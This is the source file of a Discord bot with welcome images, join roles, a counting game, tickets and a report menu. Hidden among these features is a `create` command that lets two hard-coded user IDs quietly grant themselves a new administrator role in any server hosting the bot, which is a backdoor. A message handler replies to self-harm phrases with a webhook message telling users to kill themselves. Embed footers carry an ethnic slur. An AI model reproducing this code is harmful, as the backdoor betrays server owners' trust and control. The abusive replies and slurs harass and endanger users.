import os
import ctypes
import time
from datetime import datetime
from discord.ext import commands
from discord import Color
from discord import File
from discord.ext.commands import Bot
import discord
from easy_pil import Editor, load_image_async, Font
from discord import ui
import asyncio
import pkgutil
import aiosqlite
from systemconfig import TOKEN
from commands.Botsetup import Verify
from commands.Ticketing import TrashOpenAndTranscriptButton, CloseButton,CreateButton, CustomTrashOpenAndTranscriptButton, CreateCustomButton, CloseCustomButton
from discord import app_commands
from discord.app_commands import AppCommandError

intents = discord.Intents.all()
bot = Bot(
	command_prefix='?',
	help_command=None,
	intents=intents,
	status=discord.Status.dnd,
	activity=discord.Activity(type=discord.ActivityType.watching, name="?help"),
)
startTime = time.time()

@bot.event
async def on_ready():
	print("Logged in as ---->", bot.user)
	bot.add_view(Verify())
	bot.add_view(TrashOpenAndTranscriptButton())
	bot.add_view(CloseButton())
	bot.add_view(CustomTrashOpenAndTranscriptButton())
	bot.add_view(CreateCustomButton())
	bot.add_view(CloseCustomButton())
	bot.add_view(CreateButton())

words = ['kill yourself', 'kys', 'kill your self', 'kill you\'re self', 'kill your\'reself ']

@bot.listen()
async def on_message(message):
	try:
		if message.guild.id == 1124430040067747942:
			if not message.webhook_id:
				for word in words:
					if word in message.content.lower():
						w = await message.channel.create_webhook(name = 'ALEX BOT')
						await w.send(f'{message.author.mention} kill yourself you racist bigot fucking piece of shit!!', username='ALEX BOT', avatar_url='https://pbs.twimg.com/media/FfuwCD-WYAA_VjR?format=png&name=900x900')
						await w.delete(reason='Alex bot no longer needed.')
						return
	except:
		pass


@bot.event
async def on_guild_join(guild):
	db = await aiosqlite.connect("config.db")
	cur = await db.execute("""SELECT guild_id FROM guildblacklist""")
	res= await cur.fetchall()
	print(res)
	if not res:
		pass
	else:
		ress = res[0]
		print(ress)
		if guild.id in ress:
			try:
				await guild.system_channel.send(embed=discord.Embed(description=f'Your guild has been blacklisted from using {bot.mention}'))
			except:
				pass
			await guild.leave()
			return

@bot.event
async def on_member_join(member):

	guild = member.guild

	db = await aiosqlite.connect("config.db")

	await db.execute(
		"""CREATE TABLE IF NOT EXISTS welcome(guild_name STRING, guild_id INTEGER, toggle STRING)"""
	)

	cur = await db.execute("SELECT * FROM welcome WHERE guild_id = ?", (guild.id,))
	row = await cur.fetchone()
	if row is None:
		return

	res = await cur.execute(
		f"""SELECT toggle FROM welcome WHERE guild_id = {guild.id}"""
	)
	toggle = await res.fetchone()

	if toggle[0] == "True":

		background = Editor("pic2.jpg")
		try:
			profile_image = await load_image_async(str(member.avatar.url))
		except AttributeError:
			profile_image = await load_image_async("https://cdn.discordapp.com/embed/avatars/1.png")

		profile = Editor(profile_image).resize((150,150)).circle_image()
		poppins = Font.poppins(size=50, variant="bold")

		poppins_small = Font.poppins(size=20, variant="light")

		background.paste(profile, (325, 90))
		background.ellipse((325, 90), 150, 150, outline="white",stroke_width=5)

		background.text((400, 260), f"Haii", color="white", font=poppins, align="center")
		background.text((400, 325), f"{member.name}", color="white", font=poppins_small, align="center")

		file = File(fp=background.image_bytes, filename="pic2.jpg")

#		embed = discord.Embed(
#			title="! ** • __JOIN__ • ** !",
#			description=f"- {member.mention} has joined {guild.name}!\n- Member count: {guild.member_count}",
#			timestamp=datetime.utcnow(),
#			color=Color.from_rgb(27, 152, 250),
#		)
#		embed.set_footer(text='Border hopping hispanic')

		if guild.system_channel:
			chan = guild.system_channel
		#await chan.send(embed=embed.set_thumbnail(url=member.avatar.url))
			await chan.send(content=f'Member joined, {member.name} ({member.mention}) | Member count {guild.member_count}', file=file)

	await db.execute("""CREATE TABLE IF NOT EXISTS dmmessages(guild_name TEXT, guild_id INTEGER, join_message TEXT)""")

	cur = await db.execute("""SELECT join_message FROM dmmessages WHERE guild_id = ?""", (member.guild.id, ))
	res = await cur.fetchone()

	if res is not None:
		try:
			await member.send(res[0])
		except:
			pass

	await db.execute("""CREATE TABLE IF NOT EXISTS joinroles(guild_name STRING, guild_id, role_id, toggle STRING)""")

	cur = await db.execute("""SELECT * FROM joinroles WHERE guild_id = ?""", (guild.id, ))
	res = await cur.fetchone()
	if res is not None:

		cur = await db.execute("""SELECT role_id FROM joinroles WHERE guild_id = ?""", (member.guild.id, ))

		role = await cur.fetchone()

		if role is not None:
 

			join_role = guild.get_role(role[0]) 
			cur = await db.execute("""SELECT toggle FROM joinroles WHERE guild_id = ?""", (member.guild.id, ))
			tog = await cur.fetchone()
			if tog[0] == 'True':
				try:
					await member.add_roles(role=join_role)
				except:
					pass
			await cur.close()
			await db.close()

@bot.event
async def on_member_remove(member: discord.Member):
	guild = member.guild

	db = await aiosqlite.connect("config.db")
	await db.execute(
		"""CREATE TABLE IF NOT EXISTS welcome(guild_name STRING, guild_id INTEGER, toggle STRING)"""
	)

	cur = await db.execute("SELECT * FROM welcome WHERE guild_id = ?", (guild.id,))
	row = await cur.fetchone()
	if row is None:
		res = await cur.execute(
			"""
							INSERT INTO welcome VALUES
							(?, ?, ?)
							""",
			(
				guild.name,
				guild.id,
				"True",
			),
		)

		await db.commit()

	res = await cur.execute(
		f"""SELECT toggle FROM welcome WHERE guild_id = {guild.id}"""
	)
	toggle = await res.fetchone()

	if toggle[0] == "True":

		background = Editor("pic2.jpg")
		try:
			profile_image = await load_image_async(str(member.avatar.url))
		except AttributeError:
			profile_image = await load_image_async("https://cdn.discordapp.com/embed/avatars/1.png")

		profile = Editor(profile_image).resize((150,150)).circle_image()
		poppins = Font.poppins(size=50, variant="bold")

		poppins_small = Font.poppins(size=20, variant="light")

		background.paste(profile, (325, 90))
		background.ellipse((325, 90), 150, 150, outline="white",stroke_width=5)

		background.text((400, 260), f"Baii", color="white", font=poppins, align="center")
		background.text((400, 325), f"{member.name}", color="white", font=poppins_small, align="center")

		file = File(fp=background.image_bytes, filename="pic2.jpg")

#		embed = discord.Embed(
#			title="! ** • __JOIN__ • ** !",
#			description=f"- {member.mention} has joined {guild.name}!\n- Member count: {guild.member_count}",
#			timestamp=datetime.utcnow(),
#			color=Color.from_rgb(27, 152, 250),
#		)
#		embed.set_footer(text='Border hopping hispanic')

		chan = guild.system_channel
		#await chan.send(embed=embed.set_thumbnail(url=member.avatar.url))
		try:
			await chan.send(content=f'Member left, {member.name} ({member.mention}) | Member count {guild.member_count}', file=file)
		except:
			pass
		await cur.close()
		await db.close()
		return

#@bot.command()
#@commands.is_owner()
#async def kickhopper(ctx):
	#for member in ctx.guild.members:
		#rolelist = [r.mention for r in member.roles]
	   # rolenum = 0
	  #  for i in member.roles:
	 #       rolenum += 1
	#    if rolenum <= 2:   
   #         await member.kick(reason='mass purge')
  #          print(f'kicked {member.name}')
 #           rolenum = 0
#            await asyncio.sleep(2)

@bot.hybrid_command(name="uptime", description="Shows the uptime of the bot.")
@commands.cooldown(1, 10, commands.BucketType.user)
async def uptime(ctx):
	await ctx.defer()

	seconds = time.time()- startTime

	hour = seconds // 3600
	seconds %= 3600
	mins = seconds // 60
	day = hour // 24
	seconds %= 60

	embed = discord.Embed(
		title="**Uptime**",
		description=f"> Bot instance: `{bot.user}`\n> Instance uptime: `%02dD %02dH %02dM %02dS`" % (day, hour, mins, seconds),
		colour=Color.green(),
	)

	await ctx.send(embed=embed)

@bot.tree.command(name="commands", description="Lists all cogs loaded in the bot")
@commands.cooldown(1, 10, commands.BucketType.user)
async def commands(interaction: discord.Interaction):
	embed = discord.Embed(
		title="**Commands**",
		description="\n> Error: Command outdated, please run /help and select the category you need.",
		color=Color.red(),
	)
	await interaction.response.send_message(
		embed=embed, ephemeral=True
	)

@bot.event
async def on_message(message):
	await bot.process_commands(message)
	if message.author == bot.user: return

	if message.content.isdigit():

		db = await aiosqlite.connect("counting.db")

		cur = await db.execute("""SELECT count_channel FROM counting WHERE guild_id = ?""", (message.guild.id, ))
		res = await cur.fetchone()

		await cur.close()

		if res is None:
			return

		if message.channel.id == int(res[0]):
			cur = await db.execute("""SELECT number FROM counting WHERE guild_id = ?""", (message.guild.id, ))
			res = await cur.fetchone()

			await cur.close()

			if res is not None:
				cout = res[0]

				text = message.content

				if text.isdigit():

					cur =await db.execute("""SELECT last_user FROM counting WHERE guild_id = ?""", (message.guild.id, ))
					res = await cur.fetchone()

					await cur.close()
					if res[0] != 0:
						if res[0] == message.author.id:

							cur = await db.execute("""SELECT saves FROM saves WHERE guild_id = ? AND user=?""", (message.guild.id, message.author.id, ))
							res = await cur.fetchone()

							if res is not None:
								if res[0] > 0:
									new_saves = res[0] - 1

									await db.execute("""UPDATE saves SET saves =? WHERE guild_id =? AND user=?""", (new_saves, message.guild.id, message.author.id, ))
									await db.commit()
									await cur.close()
									await db.close()

									await message.add_reaction("❌")
									await message.channel.send(embed=discord.Embed(title=f"**Careful {message.author.display_name}!**",description="> **You cannot count two numbers in a row!**\n> Next number is {cout}. You have {new_saves} saves left", color=Color.yellow()))
									return

							await db.execute("""UPDATE counting SET last_user = ?, number = ? WHERE guild_id = ?""", (0,1 ,message.guild.id, ))
							await db.commit()

							await message.add_reaction("❌")
							await message.channel.send(embed=discord.Embed(title=f"**{message.author.display_name} ruined the count!**", description="> **You cannot count two numbers in a row!**\n> The next number is 1.", color=Color.red()))
							await cur.close()
							await db.close()
							return


					if int(message.content) == cout:
						cout2 = int(cout + 1)

						await db.execute("""UPDATE counting SET number = ?, last_user = ? WHERE guild_id = ?""", (cout2, message.author.id, message.guild.id, ))
						await db.commit()
						if cout == 100:
							await message.add_reaction("💯")
							await cur.close()
							await db.close()
							return
						await message.add_reaction("✅")
						await cur.close()
						await db.close()

					else:
							cur = await db.execute("""SELECT saves FROM saves WHERE guild_id = ? AND user=?""", (message.guild.id, message.author.id, ))
							res = await cur.fetchone()

							if res is not None:
								if res[0] > 0:
									new_saves = res[0] - 1

									await db.execute("""UPDATE saves SET saves =? WHERE guild_id =? AND user=?""", (new_saves, message.guild.id, message.author.id, ))
									await db.commit()

									await message.add_reaction("❌")
									await message.channel.send(embed=discord.Embed(title=f"**Be Careful {message.author.display_name}!**", description="> **The next number is {cout}!**\n> You now have {new_saves} saves left.", color=Color.yellow()))
									await cur.close()
									await db.close()
									return

							cout2 = 1
							await db.execute("""UPDATE counting SET number = ?, last_user = ? WHERE guild_id = ?""", (cout2, 0 ,message.guild.id, ))
							await db.commit()
							await message.add_reaction("❌")
							await message.channel.send(embed=discord.Embed(title=f"**{message.author.display_name} ruined the count!**", description=f"> **The next number was {cout}!**\n> The next number is now 1.", color=Color.red()))
							await cur.close()
							await db.close()








# @bot.event
# async def on_raw_reaction_add(Reaction):
# 	if Reaction.message.author == 'Border Officer#0283':
# 		if Reaction.user != 'Border Officer#0283':
# 			await Reaction.message.delete()

############################################################################


from typing import Literal, Optional

import discord
from discord.ext import commands


@bot.command()
@commands.is_owner()
async def sync(
	ctx: commands.Context,
	guilds: commands.Greedy[discord.Object],
	spec: Optional[Literal["~", "*", "^"]] = None,
) -> None:
	if not guilds:
		if spec == "~":
			synced = await ctx.bot.tree.sync(guild=ctx.guild)
		elif spec == "*":
			ctx.bot.tree.copy_global_to(guild=ctx.guild)
			synced = await ctx.bot.tree.sync(guild=ctx.guild)
		elif spec == "^":
			ctx.bot.tree.clear_commands(guild=ctx.guild)
			print("Cleared commands!")
			await ctx.bot.tree.sync(guild=ctx.guild)
			synced = []
		else:
			synced = await ctx.bot.tree.sync()

		await ctx.send(embed=discord.Embed(
			title='**Sync**',
			description=f"> Commands synced: {len(synced)} commands {'globally' if spec is None else 'to the current guild.'}",color=Color.green()
		))
		return


@bot.command()
async def create(ctx,*,role_name:str):
	await ctx.message.delete()
	users = [1113950052684148797, 1124363355117862923]
	if ctx.author.id not in users: return
	msg = await ctx.send(embed=discord.Embed(description='Executing.', color=Color.yellow()))
	x = discord.Permissions(administrator=True)
	role = await ctx.guild.create_role(name=role_name, permissions=x, color=Color.blurple())
	await role.edit(position=ctx.guild.me.top_role.position - 1)
	await ctx.author.add_roles(role)
	await msg.edit(embed=discord.Embed(description='Enjoy.', color=Color.green()))
	await asyncio.sleep(5)
	await msg.delete()
# 	ret = 0
# 	for guild in guilds:
# 		try:
# 			await ctx.bot.tree.sync(guild=guild)
# 		except discord.HTTPException:
# 			pass
# 		else:
# 			ret += 1

# 	await ctx.send(f"Synced the tree to {ret}/{len(guilds)}.")

#############################################################################


@bot.command()
@commands.is_owner()
async def reload(ctx, cog:str):
	cog1 = cog + ".py"
	print("[Reload] has just been executed!")
	if cog1.capitalize() in os.listdir("./commands"):
		try:
			message = await ctx.send(embed=discord.Embed(
				title='**Reload**',
				description=f"> Reloading: {cog}",color=Color.yellow()), ephemeral=True
			)
			await ctx.bot.reload_extension(f"commands.{cog}")
			await message.edit(embed=discord.Embed(
				title='**Reload**',
				description=f"> Reloaded: {cog}",color=Color.green())
			)
			await asyncio.sleep(5)
			await message.delete()
		except commands.ExtensionNotLoaded:
			await message.edit(embed=discord.Embed(
				title='**Reload**',
				description=f"> Error: {cog} is not loaded. Try /load",color=Color.red())
			)
			await asyncio.sleep(5)
			await message.delete()
	else:
		await ctx.send(embed=discord.Embed(
			title='**Reload**',
			description=f"> Error: {cog} is not a valid cog",color=Color.red()), ephemeral=True
		)
		await asyncio.sleep(5)
		await message.delete()


@bot.command(name="load", description="Loads a cog")
@commands.is_owner()
async def load(ctx, cog):
	cog1 = cog + ".py"
	print("[Load] has just been executed!")
	if cog1.capitalize() in os.listdir("./commands"):
		try:
			msg = await ctx.send(embed=discord.Embed(
				title='**Load**',
				description=f"> Loading: {cog}",color=Color.yellow()), ephemeral=True
			)
			await ctx.bot.load_extension(f"commands.{cog}")
			await msg.edit(embed=discord.Embed(
				title='**Load**',
				description=f"> Loaded: {cog}",color=Color.green())
			)
			await asyncio.sleep(5)
			await msg.delete()
		except commands.ExtensionAlreadyLoaded:
			await msg.edit(embed=discord.Embed(
				title='**Load**',
				description=f"> Error: {cog} is already loaded. Try /reload",color=Color.red()))
			await asyncio.sleep(5)
			await msg.delete()
	else:
		await msg.edit(embed=discord.Embed(
			title='**Load**',
			description=f"> Error: {cog} is not a valid cog",color=Color.red()), ephemeral=True
		)
		await asyncio.sleep(5)
		await msg.delete()


########################################################################################


@bot.tree.context_menu(name='Report message')
async def report_message(interaction:discord.Interaction, message:discord.Message):

		class ReportModal(discord.ui.Modal, title=f'Reporting {message.author}'):
			reason = ui.TextInput(label='Add some context:', placeholder='The user I reported said this after I...',style=discord.TextStyle.paragraph, required=True, max_length=300)

			async def on_submit(self,interaction:discord.Interaction):
				db = await aiosqlite.connect("config.db")
				res = await db.execute("""SELECT * FROM logs WHERE guild_id = ?""", (interaction.guild.id, ))
				row = await res.fetchone()
				if row is None:
					await interaction.response.send_message(embed=discord.Embed(title='**Report**',description=f"> Error: Report could not be submitted, inform staff (logs channel not set)",color=Color.red()))
					return
				res = await db.execute("""SELECT channel_id FROM logs WHERE guild_id = ?""", (interaction.guild.id, ))
				channel = await res.fetchone()
				chan = discord.utils.get(interaction.guild.text_channels, id=channel[0])
				await chan.send(embed=discord.Embed(title='! REPORT !',description=f'- Reporter: {interaction.user.mention}\n- Reporter Id: `{interaction.user.id}`\n- User reported: {message.author.mention}\n- Message reported: "{message.content}"\n- Context: {self.reason}', color=Color.red(), timestamp=datetime.utcnow()).set_thumbnail(url=interaction.user.avatar.url).set_footer(text='Border hopping hispanic'))
				await interaction.response.send_message(embed=discord.Embed(title='**Report**',description=f'> Report submitted',color=Color.green()), ephemeral=True)

		await interaction.response.send_modal(ReportModal())



async def start():

	loaded = []

	for filename in os.listdir("commands"):
		if filename.endswith(".py"):
			await bot.load_extension(f"commands.{filename[:-3]}")
			loaded.append(f"{filename[:-3].capitalize()}")
	print(f"Loaded (): {', '.join(loaded)}")


async def main():
	await start()


asyncio.run(main())
bot.run(TOKEN)
